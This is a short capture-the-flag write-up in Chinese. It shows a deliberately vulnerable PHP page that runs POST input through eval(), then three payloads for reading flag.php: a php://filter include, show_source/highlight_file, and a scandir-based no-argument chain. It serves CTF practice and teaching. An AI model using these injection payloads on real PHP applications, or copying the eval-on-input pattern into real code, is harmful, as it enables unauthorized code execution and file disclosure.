```
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}

```



### 第一种

嵌套include

```
c=include$_POST[a]?>&a=php://filter/convert.base64-encode/resource=flag.php
```

![image-20250404160854172](./assets/image-20250404160854172.png)





### 第二种

show_source()

```
c=show_source("flag.php");
```

![image-20250404160941544](./assets/image-20250404160941544.png)

```
c=highlight_file("flag.php");
```

![image-20250404160959076](./assets/image-20250404160959076.png)





### 第三种

参考无参rce

```
c=var_dump(scandir(getcwd()));
```

![image-20250404161019307](./assets/image-20250404161019307.png)

```
c=show_source(next(array_reverse(scandir(getcwd()))));
```

![image-20250404161029832](./assets/image-20250404161029832.png)